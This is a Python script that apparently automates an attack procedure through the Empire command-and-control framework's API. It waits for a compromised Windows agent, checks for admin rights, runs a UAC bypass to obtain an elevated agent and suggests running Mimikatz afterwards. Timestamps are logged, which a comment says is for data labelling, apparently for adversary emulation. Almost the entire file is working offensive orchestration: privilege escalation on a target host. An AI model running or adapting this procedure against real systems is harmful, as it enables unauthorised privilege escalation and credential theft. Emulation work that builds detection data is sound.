""" This example demonstrates procedure scripting
    We aim to make procedure agnostic to techniques which could
    be achieved with Empire, Metasploit or whatever pen-test framework that
    supports APIs. In this case, we use Empire.
"""
import sys, os
from empire_settings import EMPIRE_SERVER, EMPIRE_USER, EMPIRE_PWD
from EmpireAPIWrapper import empireAPI
from empire_autocomplete import privesc
from stage2.external_c2 import empire_wait_for_agent, empire_get_timestamp
from stage3.internal_reconn.windows import empire_is_user_admin
from stage3.escalate_privilege.windows import empire_bypassUAC

try: 
    # use a common API context instead of a new instance per technique script
    API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
    # we assume there's a non-privilege agent, some stager was executed before
    agent = empire_wait_for_agent.run(API,'WIN-7JKBJEGBO38', False, 5)
    admin_type = empire_is_user_admin.run(API, agent['name']) 
    if admin_type is None:
        raise ValueError('BypassUAC can only be used with admin user')
        # we could try other stuff to EoP but not in this example
    # to assist data labelling, we timestamp with reference to target machine
    timestamp = empire_get_timestamp.run(API, agent['name'])
    print(timestamp + ' starting UAC bypass') # or log this
    empire_bypassUAC.run(API, agent['name'], privesc.bypassuac.path)
    # wait for non-privilege agent for 120 seconds
    agent = empire_wait_for_agent.run(API,'WIN-7JKBJEGBO38', True, 120)
    if agent is not None:
        print('yeay!!! we got an {0} admin user'.format(admin_type))    
        # you can run Mimikatz or any privilege activities...    
    timestamp = empire_get_timestamp.run(API, agent['name'])
    print(timestamp + ' ended UAC bypass') # or log this
except Exception as e:
    exc_type, exc_obj, exc_tb = sys.exc_info()
    fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
    print(exc_type, fname, exc_tb.tb_lineno) # provides exact line #
    print("Oops: " + str(e))
